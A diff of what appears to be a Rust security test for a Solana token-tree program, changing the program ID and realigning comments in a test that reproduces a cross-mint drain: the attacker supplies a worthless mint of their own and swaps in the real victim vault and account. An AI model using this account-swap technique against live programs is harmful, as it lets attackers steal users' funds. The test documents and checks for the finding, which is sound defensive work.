@@ -64,7 +64,7 @@ use wasmer::sys::global;
 
 use crate::common::utxo::default_mint_address;
 
-const PROGRAM_ID: &str = "HoumtJnPvyaavAdDgoWN78PWLSZYvezghc5FM9sEKEyV";
+const PROGRAM_ID: &str = "A6jNiYjV9g7omJ4zHAyiDQtcRewobsko7gs9UjZ2pWRa";
 const DEFAULT_ZERO: [u8; 32] = ZERO_BYTES[0]; // The default value of elements for initializing a tree
 
 pub fn generate_random_nullifier() -> [u8; 32] {
@@ -7452,12 +7452,12 @@ fn security_finding_cross_mint_tree_ata_drain() {
         withdraw_cross_check_nullifiers.1,
         ctx.global_config,
         ctx.attacker.pubkey(),
-        attacker_mint, // mint: attacker's own worthless mint
-        attacker_mint_ata, // signer_ata: attacker's own ATA, mint-checked
-        ctx.attacker.pubkey(), // recipient: unused wallet slot
-        ctx.attacker_ata, // recipient_ata: attacker's REAL victim-mint account -- SWAPPED
+        attacker_mint,              // mint: attacker's own worthless mint
+        attacker_mint_ata,          // signer_ata: attacker's own ATA, mint-checked
+        ctx.attacker.pubkey(),      // recipient: unused wallet slot
+        ctx.attacker_ata,           // recipient_ata: attacker's REAL victim-mint account -- SWAPPED
         ctx.spl_tree_token_account, // spl_tree_ata: the REAL victim vault -- SWAPPED
-        ctx.fee_recipient_ata, // fee_recipient_ata: real victim-mint fee account
+        ctx.fee_recipient_ata,      // fee_recipient_ata: real victim-mint fee account
     );
 
     let vault_before = get_token_account_state(&mut ctx.svm, &ctx.spl_tree_token_account).amount;
